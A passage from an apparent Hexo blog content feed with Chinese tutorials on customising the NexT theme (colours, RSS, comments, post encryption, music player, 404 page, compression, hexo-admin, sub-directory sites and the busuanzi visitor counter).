<p><a href="https://www.wolfdan.cn/Hexo-Next-Gemini%E4%B8%BB%E9%A2%98%E9%80%8F%E6%98%8E%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87%E7%9A%84%E6%9B%B4%E6%94%B9/">参考I</a><br><a href="http://mkco.xyz/2020/04/02/Hexo%E8%AE%BE%E7%BD%AE/Next7.0+%E8%83%8C%E6%99%AF%E7%9A%84%E8%AE%BE%E7%BD%AE/">参考II</a></p>
<p>解决按钮透明度: <code>themes\next\source\css\_common\components\post\post-button.styl</code> 同上修改对应位置为 <code>background: transparent;</code></p>
<h2 id="字体颜色"><a href="#字体颜色" class="headerlink" title="字体颜色"></a>字体颜色</h2><p><strong>博客标题及菜单栏字体颜色</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim theme/next/<span class="built_in">source</span>/css_/common/components/header/site-meta.styl</span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="attribute">color</span>: <span class="number">#00BFFF</span>;		<span class="comment">//博客标题</span></span><br></pre></td></tr></table></figure>
<p><a href="http://tool.oschina.net/commons?type=3">颜色代码表</a><br><a href="https://www.colorhexa.com/">代码查询颜色</a></p>
<p>找到博客目录下<code>theme/next/source/css_common/components/header/menu.styl</code>文件，在a{}里面添加以下代码：</p>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="attribute">color</span>: <span class="number">#00BFFF</span>;		<span class="comment">//菜单栏</span></span><br></pre></td></tr></table></figure>
<p><strong>底部字体颜色</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim theme/next/<span class="built_in">source</span>/css/_common/components/header/menu.styl	<span class="comment">#a&#123;&#125;里面添加代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.footer-inner</span> &#123;<span class="attribute">color</span>: <span class="number">#00688B</span>;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>侧边栏字体颜色</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/<span class="built_in">source</span>/css/_custom/custom.styl	<span class="comment">#加入代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#sidebar</span> &#123;           <span class="selector-tag">p</span>,<span class="selector-tag">span</span>,<span class="selector-tag">a</span> &#123;<span class="attribute">color</span>: <span class="number">#EE2C2C</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="文章模板"><a href="#文章模板" class="headerlink" title="文章模板"></a>文章模板</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim scaffolds/post.md</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">tags: [标签1,标签2,...]</span><br><span class="line">categories: [1级分类,2级分类,...]</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="配置链接文本样式"><a href="#配置链接文本样式" class="headerlink" title="配置链接文本样式"></a>配置链接文本样式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/<span class="built_in">source</span>/css/_common/components/post/post.styl <span class="comment">#修改配置文件，在末尾加入</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">p</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#0593d3</span>;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fc6423</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#fc6423</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>.post-body</code> 是为了不影响标题</p>
<p><code>p</code> 是为了不影响“阅读全文”的显示样式</p>
<p>颜色可以自定义</p>
<h2 id="配置RSS"><a href="#配置RSS" class="headerlink" title="配置RSS"></a>配置RSS</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-generator-feed	<span class="comment">#安装插件</span></span><br><span class="line">vim _config.yml		<span class="comment">#修改博客配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加RSS订阅配置内容</span></span><br><span class="line"><span class="attr">feed:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">atom</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">atom.xml</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">20</span></span><br><span class="line">  <span class="attr">hub:</span></span><br><span class="line">  <span class="attr">content:</span></span><br><span class="line">  <span class="attr">content_limit:</span> <span class="number">140</span></span><br><span class="line">  <span class="attr">content_limit_delim:</span> <span class="string">&#x27; &#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml	<span class="comment">#修改主题配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">rss:/atom.xml</span></span><br></pre></td></tr></table></figure>
<h2 id="配置评论系统"><a href="#配置评论系统" class="headerlink" title="配置评论系统"></a>配置评论系统</h2><p>到来必力注册登录，安装免费版填入相关信息后获得一串代码，在代码中有一串<code>uid</code>，将<code>uid值</code>复制出出来添加到主题配置文件中即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 来必力City版安装代码 --&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;lv-container&quot; data-id&#x3D;&quot;city&quot; data-uid&#x3D;&quot;MTAyMC80NTMxNS8yMTgyOA&#x3D;&#x3D;&quot;&gt;</span><br><span class="line">	&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">   (function(d, s) &#123;</span><br><span class="line">       var j, e &#x3D; d.getElementsByTagName(s)[0];</span><br><span class="line"></span><br><span class="line">       if (typeof LivereTower &#x3D;&#x3D;&#x3D; &#39;function&#39;) &#123; return; &#125;</span><br><span class="line"></span><br><span class="line">       j &#x3D; d.createElement(s);</span><br><span class="line">       j.src &#x3D; &#39;https:&#x2F;&#x2F;cdn-city.livere.com&#x2F;js&#x2F;embed.dist.js&#39;;</span><br><span class="line">       j.async &#x3D; true;</span><br><span class="line"></span><br><span class="line">       e.parentNode.insertBefore(j, e);</span><br><span class="line">   &#125;)(document, &#39;script&#39;);</span><br><span class="line">	&lt;&#x2F;script&gt;</span><br><span class="line">&lt;noscript&gt; 为正常使用来必力评论功能请激活JavaScript&lt;&#x2F;noscript&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;!-- City版安装代码已完成 --&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml	<span class="comment">#修改主题配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#找到LiveRe comments system</span></span><br><span class="line"><span class="comment"># LiveRe comments system</span></span><br><span class="line"><span class="comment"># You can get your uid from https://livere.com/insight/myCode (General web site)</span></span><br><span class="line"><span class="attr">livere_uid:</span> <span class="string">MTAyMC80NTMxNS8yMTgyOA==</span></span><br></pre></td></tr></table></figure>
<h2 id="文章加密"><a href="#文章加密" class="headerlink" title="文章加密"></a>文章加密</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-blog-encrypt	<span class="comment">#安装插件</span></span><br><span class="line">vim _config.yml		<span class="comment">#配置博客配置文件，文件内没有就自行添加</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Security</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="attr">encrypt:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>给文章加密</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章标题</span><br><span class="line">date: 2016-03-30 21:18:02</span><br><span class="line">password: 123456	#密码</span><br><span class="line">abstract: 有东西被加密了, 请输入密码查看.</span><br><span class="line">message: 您好, 这里需要密码.</span><br><span class="line">wrong<span class="emphasis">_pass_</span>message: 抱歉, 这个密码看着不太对, 请再试试.</span><br><span class="line">wrong<span class="emphasis">_hash_</span>message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<h2 id="侧边栏加入音乐播放器"><a href="#侧边栏加入音乐播放器" class="headerlink" title="侧边栏加入音乐播放器"></a>侧边栏加入音乐播放器</h2><p>到网易云音乐选择歌单，生成外链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe frameborder&#x3D;&quot;no&quot; border&#x3D;&quot;0&quot; marginwidth&#x3D;&quot;0&quot; marginheight&#x3D;&quot;0&quot; width&#x3D;298 height&#x3D;52 src&#x3D;&quot;&#x2F;&#x2F;music.163.com&#x2F;outchain&#x2F;player?type&#x3D;2&amp;id&#x3D;1365959078&amp;auto&#x3D;1&amp;height&#x3D;32&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/sidebar.swig	<span class="comment">#将生成的外链放到合适的位置即可</span></span><br></pre></td></tr></table></figure>
<h2 id="文章结束标语"><a href="#文章结束标语" class="headerlink" title="文章结束标语"></a>文章结束标语</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/passage-end-tag.swig	<span class="comment">#新建文件并加入内容</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style&#x3D;&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class&#x3D;&quot;fa fa-paw&quot;&gt;&lt;&#x2F;i&gt;感谢阅读-------------&lt;&#x2F;div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/post.swig	<span class="comment">#在post-body 之后(END POST BODY)， post-footer 之前添加如代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &#123;% if not is_index %&#125;</span><br><span class="line">    &#123;% include &#39;passage-end-tag.swig&#39; %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml		<span class="comment">#加入以下内容</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章末尾添加“本文结束”标记</span></span><br><span class="line"><span class="attr">passage_end_tag:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="腾讯公益404页面"><a href="#腾讯公益404页面" class="headerlink" title="腾讯公益404页面"></a>腾讯公益404页面</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/404.html	<span class="comment">#添加代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js&quot;</span> <span class="attr">homePageName</span>=<span class="string">&quot;返回宝贝回家&quot;</span> <span class="attr">homePageUrl</span>=<span class="string">&quot;http://www.baobeihuijia.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="压缩静态文件提高访问速度"><a href="#压缩静态文件提高访问速度" class="headerlink" title="压缩静态文件提高访问速度"></a>压缩静态文件提高访问速度</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-neat	<span class="comment">#安装插件</span></span><br><span class="line">vim _config.yml		<span class="comment">#添加配置信息</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#静态文件压缩</span></span><br><span class="line"><span class="comment"># hexo-neat</span></span><br><span class="line"></span><br><span class="line"><span class="attr">neat_enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#压缩html</span></span><br><span class="line"><span class="attr">neat_html:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment">#跳过压缩</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line"><span class="comment">#压缩html时不要跳过.md文件和.swig文件（模块引擎文件）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#压缩css</span></span><br><span class="line"><span class="attr">neat_css:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;**/*.min.css&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#压缩js</span></span><br><span class="line"><span class="attr">neat_js:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mangle:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">output:</span></span><br><span class="line">  <span class="attr">compress:</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/*.min.js&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/index.js&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="Hexo-admin"><a href="#Hexo-admin" class="headerlink" title="Hexo-admin"></a>Hexo-admin</h2><p>可视化界面操作文章</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-admin</span><br><span class="line">vim _config.yml</span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 管理配置</span></span><br><span class="line"><span class="attr">admin:</span></span><br><span class="line">  <span class="attr">username:</span> <span class="string">myfavoritename</span></span><br><span class="line">  <span class="attr">password_hash:</span> <span class="string">be121740bf988b2225a313fa1f107ca1</span></span><br><span class="line">  <span class="attr">secret:</span> <span class="string">a</span> <span class="string">secret</span> <span class="string">something</span></span><br></pre></td></tr></table></figure>
<p><code>password_hash</code> 是密码的哈希<br><code>secret</code> 用来保证<code>cookie</code>的安全，越长越复杂最好。</p>
<p>通过<code>http://localhost:4000/admin/</code>访问</p>
<p><a href="https://github.com/jaredly/hexo-admin">hexo-admin</a></p>
<p><a href="https://hexo.io/plugins/">hexo 插件</a></p>
]]></content>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo添加子目录站点</title>
    <url>/posts/92b22535/</url>
    <content><![CDATA[<p><strong>在Hexo博客项目根目录下</strong></p>
<h1 id="新建子目录"><a href="#新建子目录" class="headerlink" title="新建子目录"></a>新建子目录</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir <span class="built_in">source</span>/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<h1 id="创建index-html"><a href="#创建index-html" class="headerlink" title="创建index.html"></a>创建index.html</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim index.html</span><br><span class="line"># 加入内容</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;Test&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h1&gt;Test&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h1><p>  <strong>修改配置使Hexo不渲染该目录下的html内容</strong><br>  <strong>修改完后执行一下hexo clean</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.yml</span><br><span class="line"><span class="comment"># 修改skip_render</span></span><br><span class="line">skip_render: <span class="built_in">test</span>/*.html</span><br></pre></td></tr></table></figure></p>
<h2 id="单个文件夹下全部文件"><a href="#单个文件夹下全部文件" class="headerlink" title="单个文件夹下全部文件"></a>单个文件夹下全部文件</h2><p><code>skip_render: test/*</code></p>
<h2 id="单个文件夹下指定类型文件"><a href="#单个文件夹下指定类型文件" class="headerlink" title="单个文件夹下指定类型文件"></a>单个文件夹下指定类型文件</h2><p><code>skip_render: test/*.md</code></p>
<h2 id="单个文件夹下全部文件以及子目录"><a href="#单个文件夹下全部文件以及子目录" class="headerlink" title="单个文件夹下全部文件以及子目录"></a>单个文件夹下全部文件以及子目录</h2><p><code>skip_render: test/**</code></p>
<h2 id="多个文件夹以及各种复杂情况"><a href="#多个文件夹以及各种复杂情况" class="headerlink" title="多个文件夹以及各种复杂情况"></a>多个文件夹以及各种复杂情况</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">skip_render: README.md</span><br><span class="line">  - &#96;test1&#x2F;*.html&#96;</span><br><span class="line">  - &#96;test2&#x2F;**&#96;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo装live2D宠物Next主题的访问记数不显示</title>
    <url>/posts/8dba4e05/</url>
    <content><![CDATA[<p>Hexo 开启Live2D宠物后 Next 主题中的访问计数会不显示，可能是样式表中的参数冲突，需要对计数脚本中以下内容进行一些修改</p>
<ul>
<li><code>&lt;span class=&quot;post-meta-item&quot; id=&quot;busuanzi_container_site_uv&quot; style=&quot;display: none;&quot;&gt;</code></li>
<li><code>&lt;span class=&quot;post-meta-item&quot; id=&quot;busuanzi_container_site_pv&quot; style=&quot;display: none;&quot;&gt;</code></li>
<li><code>&lt;span class=&quot;site-uv&quot; title=&quot;&#123;&#123; __('footer.total_visitors') &#125;&#125;&quot;&gt;</code></li>
<li><code>&lt;span class=&quot;site-pv&quot; title=&quot;&#123;&#123; __('footer.total_views') &#125;&#125;&quot;&gt;</code></li>
</ul>
<a id="more"></a>
<h1 id="原脚本内容"><a href="#原脚本内容" class="headerlink" title="原脚本内容"></a>原脚本内容</h1><figure class="highlight plain"><figcaption><span>$blog/themes/next/layout/_third-party/statistics/busuanzi-counter.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.busuanzi_count.enable %&#125;</span><br><span class="line">&lt;div class&#x3D;&quot;busuanzi-count&quot;&gt;</span><br><span class="line">  &lt;script&#123;&#123; pjax &#125;&#125; async src&#x3D;&quot;https:&#x2F;&#x2F;busuanzi.ibruce.info&#x2F;busuanzi&#x2F;2.3&#x2F;busuanzi.pure.mini.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">  &#123;%- if theme.busuanzi_count.total_visitors %&#125;</span><br><span class="line">    &lt;span class&#x3D;&quot;post-meta-item&quot; id&#x3D;&quot;busuanzi_container_site_uv&quot; style&#x3D;&quot;display: none;&quot;&gt;</span><br><span class="line">      &lt;span class&#x3D;&quot;post-meta-item-icon&quot;&gt;</span><br><span class="line">        &lt;i class&#x3D;&quot;&#123;&#123; theme.busuanzi_count.total_visitors_icon &#125;&#125;&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">      &lt;&#x2F;span&gt;</span><br><span class="line">      &lt;span class&#x3D;&quot;site-uv&quot; title&#x3D;&quot;&#123;&#123; __(&#39;footer.total_visitors&#39;) &#125;&#125;&quot;&gt;</span><br><span class="line">        &lt;span id&#x3D;&quot;busuanzi_value_site_uv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;span&gt;</span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line"></span><br><span class="line">  &#123;%- if theme.busuanzi_count.total_visitors and theme.busuanzi_count.total_views %&#125;</span><br><span class="line">    &lt;span class&#x3D;&quot;post-meta-divider&quot;&gt;|&lt;&#x2F;span&gt;</span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line"></span><br><span class="line">  &#123;%- if theme.busuanzi_count.total_views %&#125;</span><br><span class="line">    &lt;span class&#x3D;&quot;post-meta-item&quot; id&#x3D;&quot;busuanzi_container_site_pv&quot; style&#x3D;&quot;display: none;&quot;&gt;</span><br><span class="line">      &lt;span class&#x3D;&quot;post-meta-item-icon&quot;&gt;</span><br><span class="line">        &lt;i class&#x3D;&quot;&#123;&#123; theme.busuanzi_count.total_views_icon &#125;&#125;&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">      &lt;&#x2F;span&gt;</span><br><span class="line">      &lt;span class&#x3D;&quot;site-pv&quot; title&#x3D;&quot;&#123;&#123; __(&#39;footer.total_views&#39;) &#125;&#125;&quot;&gt;</span><br><span class="line">        &lt;span id&#x3D;&quot;busuanzi_value_site_pv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;span&gt;</span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>
<h1 id="修改后的内容"><a href="#修改后的内容" class="headerlink" title="修改后的内容"></a>修改后的内容</h1><figure class="highlight plain"><figcaption><span>$blog/themes/next/layout/_third-party/statistics/busuanzi-counter.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.busuanzi_count.enable %&#125;</span><br><span class="line">&lt;div class&#x3D;&quot;busuanzi-count&quot;&gt;</span><br><span class="line">  &lt;script &#123;&#123; pjax &#125;&#125; async src&#x3D;&quot;&#x2F;&#x2F;busuanzi.ibruce.info&#x2F;busuanzi&#x2F;2.3&#x2F;busuanzi.pure.mini.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">  &#123;%- if theme.busuanzi_count.total_visitors %&#125;</span><br><span class="line">    &lt;span&gt;</span><br><span class="line">      &lt;span class&#x3D;&quot;post-meta-item-icon&quot;&gt;</span><br><span class="line">        &lt;i class&#x3D;&quot;&#123;&#123; theme.busuanzi_count.total_visitors_icon &#125;&#125;&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">      &lt;&#x2F;span&gt;</span><br><span class="line">	  &lt;span&gt;总访客&amp;nbsp&lt;span id&#x3D;&quot;busuanzi_value_site_uv&quot;&gt;&lt;&#x2F;span&gt;&amp;nbsp人&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;span&gt;</span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line"></span><br><span class="line">  &#123;%- if theme.busuanzi_count.total_visitors and theme.busuanzi_count.total_views %&#125;</span><br><span class="line">    &lt;span class&#x3D;&quot;post-meta-divider&quot;&gt;|&lt;&#x2F;span&gt;</span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line"></span><br><span class="line">  &#123;%- if theme.busuanzi_count.total_views %&#125;</span><br><span class="line">    &lt;span class&#x3D;&quot;post-meta-item&quot; &gt;</span><br><span class="line">      &lt;span class&#x3D;&quot;post-meta-item-icon&quot;&gt;</span><br><span class="line">        &lt;i class&#x3D;&quot;&#123;&#123; theme.busuanzi_count.total_views_icon &#125;&#125;&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">      &lt;&#x2F;span&gt;</span><br><span class="line">      &lt;span&gt;访问总量&amp;nbsp&lt;span id&#x3D;&quot;busuanzi_value_site_pv&quot;&gt;&lt;&#x2F;span&gt;&amp;nbsp次&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;span&gt;</span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>
<h1 id="我自己定义的内容"><a href="#我自己定义的内容" class="headerlink" title="我自己定义的内容"></a>我自己定义的内容</h1><figure class="highlight plain"><figcaption><span>$blog/themes/next/layout/_third-party/statistics/busuanzi-counter.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.busuanzi_count.enable %&#125;</span><br><span class="line">&lt;div class&#x3D;&quot;busuanzi-count&quot;&gt;</span><br><span class="line">  &lt;script&#123;&#123; pjax &#125;&#125; async src&#x3D;&quot;https:&#x2F;&#x2F;busuanzi.ibruce.info&#x2F;busuanzi&#x2F;2.3&#x2F;busuanzi.pure.mini.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">  &#123;%- if theme.busuanzi_count.total_visitors %&#125;</span><br><span class="line">    &lt;span class&#x3D;&quot;post-meta-item&quot;&gt;</span><br><span class="line">      &lt;span class&#x3D;&quot;post-meta-item-icon&quot;&gt;</span><br><span class="line">        &lt;i class&#x3D;&quot;&#123;&#123; theme.busuanzi_count.total_visitors_icon &#125;&#125;&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">      &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;span&gt;第&amp;nbsp&lt;span id&#x3D;&quot;busuanzi_value_site_uv&quot;&gt;&lt;&#x2F;span&gt;&amp;nbsp位朋友&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;span&gt;</span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line"></span><br><span class="line">  &#123;%- if theme.busuanzi_count.total_visitors and theme.busuanzi_count.total_views %&#125;</span><br><span class="line">    &lt;span class&#x3D;&quot;post-meta-divider&quot;&gt;|&lt;&#x2F;span&gt;</span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line"></span><br><span class="line">  &#123;%- if theme.busuanzi_count.total_views %&#125;</span><br><span class="line">    &lt;span class&#x3D;&quot;post-meta-item&quot;&gt;</span><br><span class="line">      &lt;span class&#x3D;&quot;post-meta-item-icon&quot;&gt;</span><br><span class="line">        &lt;i class&#x3D;&quot;&#123;&#123; theme.busuanzi_count.total_views_icon &#125;&#125;&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">      &lt;&#x2F;span&gt;</span><br><span class="line">	  &lt;span&gt;经&amp;nbsp&lt;span id&#x3D;&quot;busuanzi_value_site_pv&quot;&gt;&lt;&#x2F;span&gt;&amp;nbsp回眸与你相遇&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;span&gt;</span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo进阶</title>
    <url>/posts/4530c0eb/</url>
    <content><![CDATA[<h1 id="Next-主题进阶"><a href="#Next-主题进阶" class="headerlink" title="Next 主题进阶"></a>Next 主题进阶</h1><h2 id="阅读书签"><a href="#阅读书签" class="headerlink" title="阅读书签"></a>阅读书签</h2><p>允许用户保存阅读进度。用户只需单击页面左上角的书签图标即可保存滚动位置。当下次访问博客时，可自动恢复该页面的打书签的位置</p>
